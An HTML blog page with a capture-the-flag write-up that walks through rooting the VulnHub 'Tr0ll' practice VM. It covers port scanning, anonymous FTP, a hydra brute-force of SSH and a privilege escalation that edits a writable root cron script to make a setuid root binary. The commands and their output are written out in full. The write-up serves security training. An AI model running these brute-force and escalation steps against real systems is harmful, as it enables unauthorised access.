<!DOCTYPE html>
<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="en" lang="en-us">
<head>
  <link href="http://gmpg.org/xfn/11" rel="profile">
  <meta http-equiv="content-type" content="text/html; charset=utf-8">

  
  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1">

  <title>taming (actually just solving) the troll &middot; </title>

  
  <link rel="stylesheet" href="https://leonjza.github.io/css/poole.css">
  <link rel="stylesheet" href="https://leonjza.github.io/css/hyde.css">
  <link rel="stylesheet" href="https://leonjza.github.io/css/poole-overrides.css">
  <link rel="stylesheet" href="https://leonjza.github.io/css/hyde-overrides.css">
  <link rel="stylesheet" href="https://leonjza.github.io/css/hyde-x.css">
  <link rel="stylesheet" href="https://leonjza.github.io/css/highlight/solarized_light.css">
  <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=PT+Sans:400,400italic,700|Abril+Fatface">
  <link rel="stylesheet" href="//maxcdn.bootstrapcdn.com/font-awesome/4.3.0/css/font-awesome.min.css">

  
  <link rel="apple-touch-icon-precomposed" sizes="144x144" href="https://leonjza.github.io/touch-icon-144-precomposed.png">
  <link href="https://leonjza.github.io/favicon.png" rel="icon">

  
  
  
  

  <meta name="description" content="">
  <meta name="keywords" content="">
  
</head>
<body class="theme-base-0d">
<div class="sidebar">
  <div class="container sidebar-sticky">
    <div class="sidebar-about">
      
        <img src="https://www.gravatar.com/avatar/28d2f6c24dad39f38af0272dfc0da953?s=200"
             alt="gravatar" title="">
      
      <h1></h1>
      <p class="lead">#!/slash/note<br />
<em>A checkbox unchecker&rsquo;s notepad</em></p>
    </div>

    <ul class="sidebar-nav">
      <li class="sidebar-nav-item"><a href="https://leonjza.github.io/">Home</a></li>
      
      <li class="sidebar-nav-item"><a href="https://leonjza.github.io/about/">About</a></li>
      
    </ul>

    <ul class="sidebar-nav">
      <li class="sidebar-nav-item">
      <a href="https://github.com/leonjza"><i class="fa fa-github-square fa-3x"></i></a>
      
      
      
      
      
      <a href="https://twitter.com/leonjza"><i class="fa fa-twitter-square fa-3x"></i></a>
      
      
      </li>
    </ul>

    

    <p>Copyright &copy; 2016 <a href="https://leonjza.github.io/license/">License</a><br/>
       Powered by <a href="http://gohugo.io">Hugo</a> and <a href="https://github.com/zyro/hyde-x">Hyde-X</a></p>
  </div>
</div>


<div class="content container">
  <div class="post">
    <h1>taming (actually just solving) the troll</h1>
    <span class="post-date">Aug 15, 2014 &middot; 9 minute read &middot; <a href="https://leonjza.github.io/2014/08/15/taming-the-troll/#disqus_thread">Comments</a>
    
    <br/>
    <a class="label" href="https://leonjza.github.io/categories/ctf">CTF</a><a class="label" href="https://leonjza.github.io/categories/vulnerable-vm">Vulnerable VM</a><a class="label" href="https://leonjza.github.io/categories/solution">Solution</a><a class="label" href="https://leonjza.github.io/categories/challenge">Challenge</a><a class="label" href="https://leonjza.github.io/categories/vulnhub">VulnHub</a>
    </span>
    

<p>##foreword
Having recently started the road to <a href="http://www.offensive-security.com/information-security-certifications/oscp-offensive-security-certified-professional/">OSCP</a>, <a href="https://twitter.com/Maleus21">@Maleus21</a> released <a href="http://vulnhub.com/entry/tr0ll-1,100/">Tr0ll</a> on <a href="https://twitter.com/VulnHub">@VulnHub</a>. I figured since the description was <em>Difficulty: Beginner ; Type: boot2root</em>, I could give it a smash in a evening as a bit of distraction.</p>

<p>##nomad, promise
As usual, I downloaded the VM, extracted the <code>.rar</code> and slapped it in Virtual Box. I got the IP 192.168.56.101. Promptly a NMAP was run against it:</p>

<p>```bash Tr0ll nmap
root@kali:~# nmap -v &ndash;reason -sV 192.168.56.101 -p-</p>

<p>PORT   STATE SERVICE REASON  VERSION
21/tcp open  ftp     syn-ack vsftpd 3.0.2
22/tcp open  ssh     syn-ack (protocol 2.0)
80/tcp open  http    syn-ack Apache httpd 2.4.7 ((Ubuntu))</p>

<pre><code>
So, `ssh`, `ftp`, and `http`. Naturally my first reaction was to inspect the web service.

{% img https://i.imgur.com/SiNzlyi.png %}

The `robots.txt` file revealed:

```text Tr0ll robots.txt
User-agent:*
Disallow: /secret
</code></pre>

<p>Browsing to <code>/secret</code> revealed yet another <em>interesting</em> piece of art:</p>

<p>{% img <a href="https://i.imgur.com/E2SezsL.png">https://i.imgur.com/E2SezsL.png</a> %}</p>

<p>Right&hellip; A little early to be &lsquo;mad&rsquo;, but nonetheless, lets move on.</p>

<p>##anonny-mouse ftp
A quick and lazy google for <code>vsftpd 3.0.2 exploit</code> didn&rsquo;t reveal anything interesting on page 1, so I lost interest pretty fast. I figured I can just try my luck and attempt to login to the FTP service with anonymous creds:</p>

<p>```bash Tr0ll ftp login
root@kali:~# ftp 192.168.56.101
Connected to 192.168.56.101.
220 (vsFTPd 3.0.2)
Name (192.168.56.101:root): anonymous
331 Please specify the password.
Password:
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.</p>

<p>ftp&gt; ls
500 Illegal PORT command.
ftp: bind: Address already in use</p>

<p>ftp&gt; passive
Passive mode on.</p>

<p>ftp&gt; ls
227 Entering Passive Mode (192,168,56,101,231,190)
150 Here comes the directory listing.
-rwxrwxrwx    1 1000     0            8068 Aug 10 00:43 lol.pcap
226 Directory send OK.</p>

<p>ftp&gt; get lol.pcap
local: lol.pcap remote: lol.pcap
227 Entering Passive Mode (192,168,56,101,189,113)
150 Opening BINARY mode data connection for lol.pcap (8068 bytes).
226 Transfer complete.
8068 bytes received in 0.00 secs (21294.3 kB/s)</p>

<p>ftp&gt; bye
221 Goodbye.</p>

<pre><code>
Well that worked, and showed that we have a file `lol.pcap` to look at. Interesting. I fired up wireshark and opened the pcap. Following the TCP streams it looked like in a previous session there was activity with a file called `secret_stuff.txt` that is no longer available. I filtered out that stream and continued down the rabbit hole, until I saw the message:

{% img https://i.imgur.com/vpgEP3o.png %}

Ok. Well. I tried a few things after this, until eventually I figured it may be a web path. Sooo, off to the website we went and browsed to http://192.168.56.101/sup3rs3cr3tdirlol/. In this path there was a binary  called `roflmao`. I downloaded the bin and did some static analysis (paranoid and all that) to see if I can figure out what it does before running it. Eventually I just made it executable and ran it:

```bash Tr0ll roflmao file
root@kali:~# wget http://192.168.56.101/sup3rs3cr3tdirlol/roflmao
--2014-08-15 07:57:56--  http://192.168.56.101/sup3rs3cr3tdirlol/roflmao
Connecting to 192.168.56.101:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 7296 (7.1K)
Saving to: `roflmao'

100%[======&gt;] 7,296       --.-K/s   in 0s      

2014-08-15 07:57:56 (826 MB/s) - `roflmao' saved [7296/7296]

root@kali:~/Desktop/Tr0ll# chmod +x roflmao 
root@kali:~/Desktop/Tr0ll# ./roflmao 
Find address 0x0856BF to proceed
</code></pre>

<p>Nice. <code>0x0856BF</code> is not exactly helpful. But what does it mean? From the previous analysis I have done it also looked like the bin is really just printing the string as can be seen above. After some poking around and exchanging ideas with <a href="https://twitter.com/barrebas">@barrebas</a> on IRC, I remembered that the previous vague hint was a directory on the web site. So, I tried <a href="http://192.168.56.101/0x0856BF/:">http://192.168.56.101/0x0856BF/:</a></p>

<p>{% img <a href="https://i.imgur.com/yXWgKij.png">https://i.imgur.com/yXWgKij.png</a> %}</p>

<p>##nohydraplz</p>

<p>Cool! At this stage I was pretty sure there was not much left to gain shell. The folder <code>good_luck</code> had a file called <code>which_one_lol.txt</code> with contents:</p>

<p>```text which_one_lol.txt
maleus
ps-aux
felux
Eagle11
genphlux &lt; &ndash; Definitely not this one
usmc8892
blawrg
wytshadow
vis1t0r
overflow</p>

<pre><code>
List of passwords? Dunno. The folder `this_folder_contains_the_password` had a file `Pass.txt` with contents:

```text Pass.txt
Good_job_:)
</code></pre>

<p>At this stage I figured this had to be either a nicely provided wordlist for some <code>hydra</code> action on the <code>ftp</code> || <code>ssh</code> service. So naturally, I copied the information to a file called <code>list.txt</code> (also made a copy of the <code>genphlux</code> word so that its on its own line), and fired up hydra on <code>ssh</code>:</p>

<p>```bash Tr0ll hydra
root@kali:~# hydra -v -V -u -L list -P list -t 1 -u 192.168.56.101 ssh
Hydra v7.6 &copy;2013 by van Hauser/THC &amp; David Maciejak - for legal purposes only</p>

<p>[DATA] attacking service ssh on port 22
[VERBOSE] Resolving addresses &hellip; done
[ATTEMPT] target 192.168.56.101 - login &ldquo;maleus&rdquo; - pass &ldquo;maleus&rdquo; - 1 of 169 [child 0]
[ATTEMPT] target 192.168.56.101 - login &ldquo;ps-aux&rdquo; - pass &ldquo;maleus&rdquo; - 2 of 169 [child 0]
[ATTEMPT] target 192.168.56.101 - login &ldquo;felux&rdquo; - pass &ldquo;maleus&rdquo; - 3 of 169 [child 0]
[ATTEMPT] target 192.168.56.101 - login &ldquo;Eagle11&rdquo; - pass &ldquo;maleus&rdquo; - 4 of 169 [child 0]
[ATTEMPT] target 192.168.56.101 - login &ldquo;genphlux &lt; &ndash; Definitely not this one&rdquo; - pass &ldquo;maleus&rdquo; - 5 of 169 [child 0]
[ATTEMPT] target 192.168.56.101 - login &ldquo;genphlux&rdquo; - pass &ldquo;maleus&rdquo; - 6 of 169 [child 0]
[ATTEMPT] target 192.168.56.101 - login &ldquo;usmc8892&rdquo; - pass &ldquo;maleus&rdquo; - 7 of 169 [child 0]</p>

<p>[ERROR] could not connect to target port 22
[ERROR] ssh protocol error
[VERBOSE] Retrying connection for child 0
[RE-ATTEMPT] target 192.168.56.101 - login &ldquo;usmc8892&rdquo; - pass &ldquo;maleus&rdquo; - 7 of 169 [child 0]</p>

<p>[ERROR] could not connect to target port 22
[ERROR] ssh protocol error
[VERBOSE] Retrying connection for child 0
[RE-ATTEMPT] target 192.168.56.101 - login &ldquo;usmc8892&rdquo; - pass &ldquo;maleus&rdquo; - 7 of 169 [child 0]</p>

<pre><code>
Err, the sudden errors only meant one thing... `fail2ban`.

```bash Tr0ll ssh filtered
root@kali:~# nmap -v --reason -Pn 192.168.56.101 -p 22

PORT   STATE    SERVICE REASON
22/tcp filtered ssh     no-response

</code></pre>

<p>So, this was the first part that frustrated me and had me going <em>&ldquo;seriously&hellip; :\&rdquo;</em>. Maybe this was actually a list of <code>ftp</code> creds? Sadly, that did not seem to be the case either. And so I was stuck once again. Hydra was slowly trickling on once the ssh service was unbanned again, but it was annoying as heck.</p>

<p>##first shell
I kept bouncing the VM to get the ssh service back faster, allowing hydra to do it&rsquo;s <code>thing</code>. Eventually, it was apparent that none of these words as a username/password combination was the correct one.</p>

<p>Returning to the web interface and the word lists, I realized (with some subtle hints and reminders from @barrebas to <em>read</em> everything), that the password may be in this folder (<code>this_folder_contains_the_password</code>). Get it, the <code>Pass.txt</code> is the password&hellip;</p>

<p>Right, so I changed <code>hydra</code> slightly to use <code>Pass.txt</code> as a password and continued to brute with the original <code>list.txt</code> as usernames:</p>

<p>``<code>bash Tr0ll hydra success</code>
root@kali:~# hydra -v -V -u -L list -p &ldquo;Pass.txt&rdquo; -t 1 -u 192.168.56.101 ssh
Hydra v7.6 &copy;2013 by van Hauser/THC &amp; David Maciejak - for legal purposes only</p>

<p>[DATA] 1 task, 1 server, 13 login tries (l:13/p:1), ~13 tries per task
[DATA] attacking service ssh on port 22
[VERBOSE] Resolving addresses &hellip; done
[ATTEMPT] target 192.168.56.101 - login &ldquo;maleus&rdquo; - pass &ldquo;Pass.txt&rdquo; - 1 of 13 [child 0]
[ATTEMPT] target 192.168.56.101 - login &ldquo;ps-aux&rdquo; - pass &ldquo;Pass.txt&rdquo; - 2 of 13 [child 0]
[ATTEMPT] target 192.168.56.101 - login &ldquo;felux&rdquo; - pass &ldquo;Pass.txt&rdquo; - 3 of 13 [child 0]
[&hellip;]
[22][ssh] host: 192.168.56.101   login: overflow   password: Pass.txt</p>

<pre><code>
Yay `overflow:Pass.txt` should get us a session via ssh:

```bash Tr0ll ssh
root@kali:~/Desktop/Tr0ll# ssh overflow@192.168.56.101
overflow@192.168.56.101's password: 
Welcome to Ubuntu 14.04.1 LTS (GNU/Linux 3.13.0-32-generic i686)

[...]

Could not chdir to home directory /home/overflow: No such file or directory
$ id
uid=1002(overflow) gid=1002(overflow) groups=1002(overflow)
</code></pre>

<p>##&hellip; and root
And so it was time for classic enumeration again. The first <em>strange</em> thing was the fact that it appeared as if all the <code>/home</code> directories apart from <code>/home/troll</code> was deleted. Weird. Other than that, there were a whole bunch of users according to <code>/etc/passwd</code>, and I can&rsquo;t run anything as <code>root</code> via <code>sudo</code>.</p>

<p>There was a file in <code>/opt/</code> called <code>lmao.py</code>, however I did not have access to read it. Soooo, more enumeration.</p>

<p><em>suddenly</em></p>

<p>```bash Tr0ll times up
Broadcast Message from root@trol<br />
        (somewhere) at 16:05 &hellip;</p>

<p>TIMES UP LOL!</p>

<p>Connection to 192.168.56.101 closed by remote host.
Connection to 192.168.56.101 closed.
root@kali:~#</p>

<pre><code>
Urgh. Turns out, something is killing my ssh session every 5 minutes. **Oh my word**, was that annoying. I could handle everything the VM's offered, but this was probably the worst part of it.

Eventually, I was searching for executable files on the filesystem. I was filtering out a large chunk and gradually paging though results to find that odd one out. To help filter out uninteresting stuff, it looked like the VM was built in August, so I just grep for that in the results, hoping that the _thing_ I should be finding has a more recent timestamp:

```bash Tr0ll check 
overflow@troll:/$ find / -executable -type f 2&gt; /dev/null | egrep -v &quot;^/bin|^/var|^/etc|^/usr&quot; | xargs ls -lh | grep Aug

-rwxrwxrwx 1 root  root    145 Aug 14 13:11 /lib/log/cleaner.py
-rwx--x--x 1 root  root    117 Aug 10 02:11 /opt/lmao.py
-rwxr-xr-x 1 root  root   2.4K Aug 27  2013 /sbin/installkernel
-rwxrwxrwx 1 troll root   7.9K Aug 10 00:43 /srv/ftp/lol.pcap
</code></pre>

<p>A few interesting results came from that, however, the one that held the golden nugget was <code>/lib/log/cleaner.py</code>. During my enumeration I noticed that <code>/tmp</code> got cleaned out at a really strange time as I was still trying to <code>less</code> a file in there, however, it just <em>disappeared</em>.</p>

<p>Anyways, as <code>cleaner.py</code> was owned by root and running <code>os.system</code>, I just modified it to prepare me a classic <code>getroot</code> binary:</p>

<p>```python cleaner.py
#!/usr/bin/env python
import os
import sys
try:
    os.system(&lsquo;chown root:root /var/tmp/getroot; chmod 4755 /var/tmp/getroot &lsquo;)
except:
    sys.exit()</p>

<pre><code>
I waited for that annoying 'Times UP' message, and inspected `/var/tmp`:

```bash rooted
overflow@troll:/$ ls -lah /var/tmp/
total 24K
drwxrwxrwt  2 root     root     4.0K Aug 14 13:11 .
drwxr-xr-x 12 root     root     4.0K Aug 10 03:56 ..
-rwxrwxrwx  1 root     root       34 Aug 13 01:16 cleaner.py.swp
-rwsr-xr-x  1 root     root     7.2K Aug 14 13:09 getroot
-rw-rw-r--  1 overflow overflow   71 Aug 14 13:09 sh.c

overflow@troll:/$ /var/tmp/getroot 
#
# id
uid=0(root) gid=1002(overflow) groups=0(root),1002(overflow)

# ls /root
proof.txt

# cat /root/proof.txt
Good job, you did it! 


702a8c18d29c6f3ca0d99ef5712bfbdc
#
</code></pre>

<p>##for the curious
That really annoying session that keeps dying? Turns out its <code>/opt/lmao.py</code> to blame:</p>

<p>```python grr</p>

<h1 id="cat-opt-lmao-py:0308f0b3905abd0adc5f6451e7495cbf">cat /opt/lmao.py</h1>

<p>#!/usr/bin/env python
import os</p>

<p>os.system(&lsquo;echo &ldquo;TIMES UP LOL!&rdquo;|wall&rsquo;)
os.system(&ldquo;pkill -u &lsquo;overflow&rsquo;&rdquo;)
sys.exit()</p>

<p>```</p>

<p>Thanks <a href="https://twitter.com/maleus21">@maleus21</a> for the VM!</p>

  </div>
  <div id="disqus_thread"></div>
</div>


<script type="text/javascript">
var disqus_shortname = "slashnote";
(function () {
    var s = document.createElement('script'); s.async = true;
    s.type = 'text/javascript';
    s.src = '//' + disqus_shortname + '.disqus.com/count.js';
    (document.getElementsByTagName('HEAD')[0] || document.getElementsByTagName('BODY')[0]).appendChild(s);
}());
</script>



<script type="text/javascript">
    var disqus_shortname = "slashnote";
    (function() {
        var dsq = document.createElement('script'); dsq.type = 'text/javascript'; dsq.async = true;
        dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
        (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
    })();
</script>
<noscript>Please enable JavaScript to view the <a href="http://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
<a href="http://disqus.com" class="dsq-brlink">comments powered by <span class="logo-disqus">Disqus</span></a>

<script src="https://leonjza.github.io/js/highlight.pack.js"></script>
<script>hljs.initHighlightingOnLoad();</script>

<script>
  var _gaq=[['_setAccount','UA-44457032-2'],['_trackPageview']];
  (function(d,t){var g=d.createElement(t),s=d.getElementsByTagName(t)[0];
  g.src=('https:'==location.protocol?'//ssl':'//www')+'.google-analytics.com/ga.js';
  s.parentNode.insertBefore(g,s)}(document,'script'));
</script>

</body>
</html>

